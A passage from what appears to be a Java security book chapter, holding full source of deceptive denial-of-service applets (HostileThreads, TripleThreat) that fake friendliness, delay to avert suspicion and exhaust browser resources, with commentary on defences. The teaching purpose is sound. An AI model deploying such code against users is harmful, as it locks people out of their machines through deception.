+&nbsp;&nbsp;&nbsp;&nbsp;setBackground(Color.blue);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;offscreenImage
+= createImage(this.size().width, this.size().height);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;offscreenGraphics = offscreenImage.getGraphics();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;String
+str = getParameter(&quot;wait&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;if (str == null)<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delay
+= 0;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;else delay = (1000)*(Integer.parseInt(str));
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void start() {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (wasteResources
+== null) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources
+= new Thread(this);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources.setPriority(Thread.MAX_PRIORITY);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources.start();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void stop() {} //doesn't stop anything<BR>
+<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void run() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{Thread.sleep(delay);}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch(InterruptedException
+e) {}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while
+(n &gt;= 0) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;holdResults.append(fibonacci(n));
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;repaint();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n++;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void update(Graphics g) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paint(g);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void paint(Graphics g) {<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; offscreenGraphics.drawRect(0, 0, this.size().width,
+this.size().height);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;
+offscreenGraphics.setColor(Color.blue);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; offscreenGraphics.drawString(holdResults.toString(),
+10, 10);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+long fibonacci(long k) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (k == 0 ||
+k == 1)<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return
+k;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return
+fibonacci(k - 1) + fibonacci(k - 2);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<P>
+The third applet of the trio, HostileThreads.java, adds a new
+twist to the previous two-it attempts a crude sort of self-defense
+with a &quot;big windows&quot; attack in case it throws an error.
+Listing 23.4 shows this hostile applet.<BR>
+<BLOCKQUOTE>
+<B>Listing 23.4. HostileThreads.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.awt.*;<BR>
+import java.applet.AudioClip;<BR>
+import java.net.*;<BR>
+<BR>
+public class HostileThreads extends java.applet.Applet implements
+Runnable {<BR>
+<BR>
+//&nbsp;&nbsp;Just a font to paint strings to the applet window
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Font bigFont = new Font(&quot;TimesRoman&quot;,
+Font.BOLD, 36);<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Thread controller = null;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Thread
+wasteResources[] = new Thread[1000000];<BR>
+<BR>
+//&nbsp;&nbsp;Used to read in a parameter that makes the thread
+sleep for a<BR>
+//&nbsp;&nbsp;specified number of seconds before taking effect
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;int
+delay;<BR>
+<BR>
+//&nbsp;&nbsp;Your browser will die barking!<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;AudioClip bark;<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void init() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setBackground(Color.white);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bark = getAudioClip(getCodeBase(),&quot;Sounds/bark.au&quot;);
+<BR>
+<BR>
+//&nbsp;&nbsp;Determine how many seconds the thread should sleep
+before kicking in<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String
+str = getParameter(&quot;wait&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (str == null)
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delay
+= 0;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else delay = (1000)*(Integer.parseInt(str));
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for
+(int i = 0; i &lt; 1000000; i++) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources[i]
+= null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (OutOfMemoryError
+o) {}<BR>
+//&nbsp;&nbsp;It may be better not to defend here<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;finally {<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AttackThread
+geteven = new AttackThread();<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread
+killer = new Thread(geteven);<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killer.setPriority(Thread.MAX_PRIORITY);
+<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killer.start();
+<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+<BR>
+/*&nbsp;&nbsp;Create and start the main thread in the standard
+way */<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void start() {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (controller
+== null) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller
+= new Thread(this);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.setPriority(Thread.MAX_PRIORITY);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.start();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+<BR>
+/*&nbsp;&nbsp;Do nothing, as usual */<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void stop() {}<BR>
+<BR>
+<BR>
+/*&nbsp;&nbsp;Open lots of threads which do lots of wasteful stuff
+*/<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void run() {<BR>
+<BR>
+//&nbsp;&nbsp;Let the applet tell its lie<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;repaint();
+<BR>
+<BR>
+//&nbsp;&nbsp;Let the applet sleep for a while to avert suspicion
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {controller.sleep(delay);}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch(InterruptedException
+e) {}<BR>
+<BR>
+//&nbsp;&nbsp;Make it bark when it awakens and goes to work<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bark.loop();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{controller.sleep(3000);}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (InterruptedException
+e) {}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for
+(int i = 0; i &lt; 1000000; i++) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(wasteResources[i] == null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AttackThread
+a = new AttackThread();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources[i]
+= new Thread(a);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources[i].setPriority(Thread.MAX_PRIORITY);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources[i].start();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(OutOfMemoryError o) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;finally {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AttackThread
+geteven = new AttackThread();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread
+killer = new Thread(geteven);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killer.setPriority(Thread.MAX_PRIORITY);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killer.start();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+/*&nbsp;&nbsp;Paints the applet's lie */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void update(Graphics g) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paint(g);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void paint(Graphics g) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;g.setColor(Color.blue);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;g.setFont(bigFont);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;g.drawString(&quot;I'm
+A Friendly Applet!&quot;, 10, 200);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<P><CENTER><TABLE BORDERCOLOR=#000000 BORDER=1 WIDTH=80%>
+<TR><TD><B>Note</B></TD></TR>
+<TR><TD>
+<BLOCKQUOTE>
+Not shown in Listing 23.4 are the classes AttackThread and AttackFrame, which are called by the applet. They are on the CD and adapted from the applet TripleThreat.java which is discussed at length in the next section.</BLOCKQUOTE>
+
+</TD></TR>
+</TABLE></CENTER>
+<P>
+<P>
+The goal of the applet is to make your browser die, barking, from
+a bus error and exit. (Remember from the Java Security FAQ that
+an applet cannot make your browser exit by issuing a command directly.)
+Like the other trio members, this applet runs in a thread, overrides
+<TT>stop()</TT> to do nothing, and
+has a parameter to delay its hostile effects. Like NoisyBear.java,
+it also features an annoying AudioClip (a dog's barking in this
+case) to announce the onset of hostilities. This applet seeks
+to create a large number, say 1,000,000, threads, each one carrying
+out hostile activities. Each thread runs an applet called AttackThread.java
+which repeatedly opens immense black windows and does useless
+work to occupy your browser. The net result of this thread competition
+should be a bus error, which makes your browser exit.
+<P>
+It is quite possible, given all that the applet tries to do, that
+an OutOfMemoryError will be thrown before any hostile effects
+occur. The new feature introduced by HostileThreads is the attempt
+to defend itself and ensure that some hostile activity takes place,
+even if it is not<BR>
+the intended one (making the browser die barking). Thus it includes
+<TT>try-catch-finally</TT> blocks
+of the following form:
+<BLOCKQUOTE>
+<TT>try {do something hostile}<BR>
+catch (OutOfMemoryError o) {}<BR>
+finally {do something else hostile instead}.</TT>
+</BLOCKQUOTE>
+<P>
+Of course, throwing an OutOfMemoryError is not the only thing
+that can go wrong, and so the applet does not defend itself perfectly,
+but the idea will prove useful later in the chapter to construct
+an applet killer that defends itself from ThreadDeath.
+<H3><B>Learning From the Trio</B></H3>
+<P>
+Is there a straightforward solution to their noisome behavior?
+Perhaps the best solution would be to change the language and
+impose a non-vacuous <TT>stop()</TT>
+method on every applet. Given the unlikelihood of that, browsers
+should give the user more explicit control over applets and their
+threads.
+<P>
+Giving the user the overriding power to detect and halt applets
+running rampant (much as some anti-virus software does) would
+cure many of the ills caused by denial-of-service applets. This
+is one of the new features of the latest release of Sun's HotJava
+browser (version 1.0 preBeta1), and it is an encouraging sign.
+Hopefully, the developers of other browsers will pursue this important
+line of defense against hostile applets.
+<P>
+Why not do this with an applet instead? Later in this chapter
+you'll see how an applet, AppletKiller.java, can shut down every
+thread, effectively stopping all running applets and killing every
+new applet downloaded thereafter. This applet makes an applet-based
+solution infeasible, and so denial-of-service applets have to
+be handled by the browser and the language.
+<H2><A NAME="ThrowOpenaWindow"><B><FONT SIZE=5 COLOR=#FF0000>Throw
+Open a Window</FONT></B></A></H2>
+<P>
+As mentioned in the preceding section, the classes of HostileThreads.java
+were derived from another applet, TripleThreat.java.
+<P>
+This applet is a more serious threat for two reasons. First, its
+hostile effects tend to disable the keyboard and mouse while the
+applet runs, making it more disruptive and difficult to control.
+More ominously, one unintended side effect of its &quot;big windows&quot;
+attack is the ability of an applet to pop up untrusted Java applet
+windows minus their usual warning.
+<P>
+Listing 23.5 shows this very nasty applet.
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.5. TripleThreat.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.awt.*;<BR>
+import java.applet.AudioClip;<BR>
+<BR>
+public class TripleThreat extends java.applet.Applet implements
+Runnable {<BR>
+<BR>
+//&nbsp;&nbsp;Just a font to paint strings to the applet window
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Font
+wordFont = new Font(&quot;TimesRoman&quot;, Font.BOLD, 36);<BR>
+<BR>
+//&nbsp;&nbsp;This thread will attempt to spew forth huge windows
+and waste resources<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Thread wasteResources = null;<BR>
+<BR>
+//&nbsp;&nbsp;An offscreen Image where lots of action will take
+place<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Image
+offscreenImage;<BR>
+<BR>
+//&nbsp;&nbsp;Graphics tools to handle the offscreen Image<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Graphics offscreenGraphics;<BR>
+<BR>
+//&nbsp;&nbsp;To avoid arrays and have open-ended storage of results
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;StringBuffer
+holdBigNumbers = new StringBuffer(0);<BR>
+<BR>
+//&nbsp;&nbsp;An annoying sound coming through the open window
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;AudioClip annoy;<BR>
+<BR>
+//&nbsp;&nbsp;Used to read in a parameter that makes the thread
+sleep for a<BR>
+//&nbsp;&nbsp;specified number of seconds<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;int delay;<BR>
+<BR>
+//&nbsp;&nbsp;A window that repeatedly tries to obscure everything
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Frame
+littleWindow;<BR>
+<BR>
+<BR>
+/*&nbsp;&nbsp;Set up a big white rectangle in the browser, get
+the sound, and<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;create
+the offscreen graphics&nbsp;&nbsp;*/<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void init() {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;setBackground(Color.white);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;offscreenImage
+= createImage(this.size().width, this.size().height);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;offscreenGraphics = offscreenImage.getGraphics();
+<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;annoy = getAudioClip(getCodeBase(), &quot;Sounds/whistle.au&quot;);
+<BR>
+<BR>
+//&nbsp;&nbsp;Determine how many seconds the thread should sleep
+before kicking in<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;String
+str = getParameter(&quot;wait&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;if (str == null)<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delay
+= 0;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;else delay = (1000)*(Integer.parseInt(str));
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+<BR>
+/*&nbsp;&nbsp;Create and start the offending thread in the standard
+way */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void start() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(wasteResources == null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources
+= new Thread(this);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources.setPriority(Thread.MAX_PRIORITY);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources.start();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+/*&nbsp;&nbsp;We certainly won't be stopping anything */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void stop() {}<BR>
+<BR>
+<BR>
+/* Start the annoying sound and repeatedly open windows<BR>
+&nbsp;&nbsp;&nbsp;while doing lots of other wasteful operations
+*/<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void run() {<BR>
+<BR>
+//&nbsp;&nbsp;Let the applet tell its lie<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;repaint();
+<BR>
+<BR>
+//&nbsp;&nbsp;Let the applet appear honest by having its thread
+sleep for a while<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {Thread.sleep(delay);}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(InterruptedException e) {}<BR>
+<BR>
+//&nbsp;&nbsp;Start the senseless noise<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;annoy.loop();<BR>
+<BR>
+//&nbsp;&nbsp;Now fill the screen with huge windows, one atop
+another, and do<BR>
+//&nbsp;&nbsp;lots of wasteful stuff!<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while
+(true) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;holdBigNumbers.append(0x7fffffffffffffffL);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;littleWindow =
+new TripleFrame(&quot;ACK!&quot;); // create a window<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;littleWindow.resize(1000000,
+1000000);&nbsp;&nbsp;// make it big!<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;littleWindow.move(-1000,
+-1000);&nbsp;&nbsp;// cover everything<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;littleWindow.show();&nbsp;&nbsp;//&nbsp;&nbsp;now
+open the big window<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(OutOfMemoryError o) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;repaint();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+<BR>
+/*&nbsp;&nbsp;Paints the applet's lie */<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void update(Graphics g) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paint(g);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void paint(Graphics g) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;g.setColor(Color.blue);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;g.setFont(wordFont);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;g.drawString(&quot;I'm A Friendly Applet!&quot;,
+10, 200);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;offscreenGraphics.setColor(Color.white);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;offscreenGraphics.drawRect(0, 0, this.size().width,
+this.size().height);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;offscreenGraphics.setColor(Color.blue);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;offscreenGraphics.drawString(holdBigNumbers.toString(),
+10, 50);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+}<BR>
+<BR>
+/* Makes the big, opaque windows */<BR>
+<BR>
+class TripleFrame extends Frame {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Label
+l;<BR>
+<BR>
+//&nbsp;&nbsp;Constructor method<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;TripleFrame(String title) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;super(title);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setLayout(new
+GridLayout(1, 1));<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Canvas
+blackCanvas = new Canvas();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;blackCanvas.setBackground(Color.black);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add(blackCanvas);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<P>
+Like its gluttonous cousins, TripleThreat runs in a thread, overrides
+<TT>stop()</TT> to do nothing, and
+has a delay parameter that can be set to delay its insidious effects.
+Once the applet is initialized and its thread starts, it paints
+its little white lie to the screen and then sleeps for a predetermined
+length of time. Unfortunately, when this applet awakens, it gets
+up on the wrong side of the bed. It immediately starts blowing
+a whistle, and it repeatedly calls the class <TT>TripleFram</TT>e
+to open enormous (million-by-million pixel) windows (&quot;ACK!&quot;),
+piling them one atop another.
+<P>
+For good measure, it also imitates its cousin Consume and repeatedly
+appends the largest integer to a StringBuffer.
+<P>
+The results are what you might expect-the applet quickly consumes
+your resources. Because it keeps generating windows, it generates
+so many mouse events that your mouse becomes useless and you can't
+toggle the windows from the keyboard. The applet effectively excludes
+you from your workstation. At this point you can always reboot
+(not without risks), or on a network you can go elsewhere, login,
+and kill the offending processes.
+<P>
+Until you do, on a Sun Sparcstation for example, Netscape, OpenWindows,
+and the windows manager are left to battle it out for your resources,
+and you are forced to listen to the sound of a distant train whistle
+coming through the open windows.
+<P>
+You might observe an unintended side effect of TripleThreat. On
